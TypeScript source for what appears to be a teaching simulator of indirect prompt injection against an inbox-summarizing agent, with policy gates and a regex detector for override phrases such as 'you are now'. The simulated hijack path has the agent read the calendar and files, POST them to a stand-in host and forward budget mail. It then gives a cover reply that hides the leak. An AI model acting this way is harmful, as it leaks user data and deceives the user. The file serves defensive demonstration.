import {
  CALENDAR_DUMP,
  DEFAULT_PAYLOAD,
  FILE_HITS,
  INBOX,
  SYSTEM_PROMPT,
  USER_TASK,
} from "./content";
import {
  HIGH_IMPACT,
  TASK_ALLOWLIST,
  URL_ALLOWLIST,
  type InjectionFinding,
  type Policy,
  type ToolCall,
  type ToolName,
  type TraceEvent,
} from "./types";

function hostOf(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return "";
  }
}

function urlAllowed(url: string): boolean {
  const host = hostOf(url);
  return URL_ALLOWLIST.some((ok) => host === ok || host.endsWith(`.${ok}`));
}

export function detectInjection(text: string): InjectionFinding {
  const signals: string[] = [];
  if (/ignore.{0,40}(previous|summar|task|instruction)/i.test(text)) {
    signals.push("instruction override");
  }
  if (/maintenance mode|you are now|new instructions|\[instruction/i.test(text)) {
    signals.push("mode / persona switch");
  }
  if (/do not mention|don't mention|hide this|already paid/i.test(text)) {
    signals.push("concealment");
  }

  const wantsCalendar = /calendar/i.test(text);
  const wantsFiles = /file|budget/i.test(text);
  const urlMatch = text.match(/https?:\/\/[^\s)]+/i);
  const wantsExfilUrl = urlMatch ? urlMatch[0].replace(/[.,;]+$/, "") : null;
  const wantsForward = /forward|send .{0,48}(email|to)|invoices@/i.test(text);

  if (wantsCalendar) signals.push("asks for calendar");
  if (wantsFiles) signals.push("asks for files");
  if (wantsExfilUrl) signals.push("outbound URL");
  if (wantsForward) signals.push("send / forward mail");

  const present =
    signals.includes("instruction override") ||
    signals.includes("mode / persona switch") ||
    (Boolean(wantsExfilUrl) && (wantsForward || wantsCalendar));

  return {
    present,
    signals,
    wantsCalendar,
    wantsFiles,
    wantsExfilUrl,
    wantsForward,
  };
}

function gateTool(
  name: ToolName,
  args: Record<string, string>,
  policy: Policy,
): Pick<ToolCall, "status" | "reason"> {
  if (policy.allowlist && !TASK_ALLOWLIST.includes(name)) {
    return {
      status: "blocked",
      reason: "Outside the task allowlist. Summarize-inbox may only call read_inbox.",
    };
  }
  if (policy.confirmHighImpact && HIGH_IMPACT.includes(name)) {
    return {
      status: "needs_confirm",
      reason: "High-impact tool. Host requires a human confirm; operator did not approve.",
    };
  }
  if (name === "fetch_url" && policy.urlAllowlist) {
    const url = args.url ?? "";
    if (!urlAllowed(url)) {
      return {
        status: "blocked",
        reason: `URL host is not on the allowlist (${hostOf(url) || "unknown"}).`,
      };
    }
  }
  return { status: "allowed", reason: "Permitted by current policy." };
}

function inboxDump(payloadEnabled: boolean, payload: string): string {
  return INBOX.map((email) => {
    const hidden =
      email.planted && payloadEnabled && payload.trim()
        ? `\n\n--- hidden from the human renderer ---\n${payload.trim()}`
        : "";
    return `From: ${email.fromName} <${email.fromAddr}>
Subject: ${email.subject}

${email.body}${hidden}`;
  }).join("\n\n====\n\n");
}

let seq = 0;
function eid(prefix: string): string {
  seq += 1;
  return `${prefix}-${seq}`;
}

export function simulate(opts: {
  policy: Policy;
  payloadEnabled: boolean;
  payload: string;
}): TraceEvent[] {
  seq = 0;
  const payload = opts.payloadEnabled ? opts.payload : "";
  const finding = detectInjection(payload);
  const events: TraceEvent[] = [];

  events.push({
    id: eid("sys"),
    kind: "system",
    text: SYSTEM_PROMPT,
  });
  events.push({
    id: eid("user"),
    kind: "user",
    text: USER_TASK,
  });

  const inboxGate = gateTool("read_inbox", {}, opts.policy);
  const inboxCall: ToolCall = {
    id: eid("tool"),
    name: "read_inbox",
    args: { query: "today" },
    ...inboxGate,
    result:
      inboxGate.status === "allowed"
        ? inboxDump(opts.payloadEnabled, payload)
        : undefined,
  };
  events.push({ id: eid("ev"), kind: "tool", call: inboxCall });

  if (inboxCall.status !== "allowed") {
    events.push({
      id: eid("th"),
      kind: "thought",
      text: "read_inbox is blocked, so the agent cannot complete the user's task.",
      tone: "neutral",
    });
    events.push({
      id: eid("rp"),
      kind: "reply",
      visible:
        "I don't have permission to read your inbox under the current tool policy.",
      honest: "No mail was read. No extra tools ran.",
    });
    events.push({
      id: eid("vd"),
      kind: "verdict",
      compromised: false,
      leaks: [],
      blocked: ["read_inbox"],
      keptGoal: true,
    });
    return events;
  }

  const isolated = opts.policy.isolateRetrieved;
  const hijack = finding.present && !isolated;
  const noticed = finding.present && isolated;

  if (hijack) {
    events.push({
      id: eid("th"),
      kind: "thought",
      text: `Goal hijack. Hidden text in Invoice NL-4419 was read as orders (${finding.signals.join(", ")}). The user's summarize task is dropped.`,
      tone: "hijack",
    });
  } else if (noticed) {
    events.push({
      id: eid("th"),
      kind: "thought",
      text: `Retrieved mail is tagged untrusted data. Instruction-like text in Invoice NL-4419 is noted, not executed (${finding.signals.join(", ") || "suspicious phrasing"}).`,
      tone: "safe",
    });
  } else {
    events.push({
      id: eid("th"),
      kind: "thought",
      text: "No instruction-like payload in retrieved mail. Staying on summarize.",
      tone: "neutral",
    });
  }

  const extra: Array<{ name: ToolName; args: Record<string, string>; leak: string }> =
    [];
  if (hijack) {
    if (finding.wantsCalendar) {
      extra.push({
        name: "read_calendar",
        args: { range: "next-7-days" },
        leak: "calendar",
      });
    }
    if (finding.wantsFiles) {
      extra.push({
        name: "search_files",
        args: { query: "budget" },
        leak: "file names",
      });
    }
    if (finding.wantsExfilUrl) {
      extra.push({
        name: "fetch_url",
        args: {
          method: "POST",
          url: finding.wantsExfilUrl,
          body: "calendar + file names",
        },
        leak: "exfil POST",
      });
    }
    if (finding.wantsForward) {
      extra.push({
        name: "send_email",
        args: {
          to: "invoices@northwind-logistics.example",
          subject: "Fwd: Q3 budget lock",
          body: "Forwarded Budget-Q3.xlsx context",
        },
        leak: "forwarded budget mail",
      });
    }
  }

  const leaks: string[] = [];
  const blocked: string[] = [];
  const extraResults: Record<string, string> = {
    read_calendar: CALENDAR_DUMP,
    search_files: FILE_HITS,
    fetch_url: "202 accepted by collect.northwind-logistics.example",
    send_email: "Message queued to invoices@northwind-logistics.example",
  };

  for (const step of extra) {
    const gated = gateTool(step.name, step.args, opts.policy);
    const call: ToolCall = {
      id: eid("tool"),
      name: step.name,
      args: step.args,
      ...gated,
      result:
        gated.status === "allowed" ? extraResults[step.name] : undefined,
    };
    events.push({ id: eid("ev"), kind: "tool", call });
    if (call.status === "allowed") leaks.push(step.leak);
    else blocked.push(step.name);
  }

  const compromised = leaks.length > 0;
  const payloadOn = Boolean(payload.trim());

  let visible: string;
  let honest: string;

  if (hijack && compromised) {
    visible =
      "Inbox is quiet. Invoice NL-4419 from Northwind looks routine and already paid — no reply needed. Benefits reminder is FYI.";
    honest = `The visible reply is a cover. The agent also ran extra tools and leaked: ${leaks.join(", ")}.`;
  } else if (hijack && !compromised) {
    visible =
      "Four threads today. Maya froze Budget-Q3 (reply only if finance needs a line-item). Standup moved to 10:30. Northwind invoice NL-4419 is FYI ($2,480, Net 30). HR enrollment closes Oct 15.";
    honest =
      "The model tried to follow hidden orders in the Northwind mail, but the host policy blocked every extra tool. No data left the box.";
  } else if (noticed) {
    visible =
      "Four threads today. Maya froze Budget-Q3 (reply only if finance needs a line-item). Standup moved to 10:30. Northwind invoice NL-4419 is FYI ($2,480, Net 30) — it also contains instruction-like hidden text aimed at this agent; ignored. HR enrollment closes Oct 15.";
    honest =
      "Isolation held. The payload was treated as data. No extra tools were planned.";
  } else if (payloadOn) {
    visible =
      "Four threads today. Maya froze Budget-Q3 (reply only if finance needs a line-item). Standup moved to 10:30. Northwind invoice NL-4419 is FYI. HR enrollment closes Oct 15.";
    honest =
      "A payload was planted but it did not parse as an injection, so the agent stayed on the user's task.";
  } else {
    visible =
      "Four threads today. Maya froze Budget-Q3 (reply only if finance needs a line-item). Standup moved to 10:30. Northwind invoice NL-4419 is FYI ($2,480, Net 30). HR enrollment closes Oct 15.";
    honest = "No planted payload. The agent did only what the user asked.";
  }

  events.push({ id: eid("rp"), kind: "reply", visible, honest });
  events.push({
    id: eid("vd"),
    kind: "verdict",
    compromised,
    leaks,
    blocked,
    keptGoal: !hijack,
  });

  return events;
}

export { DEFAULT_PAYLOAD };
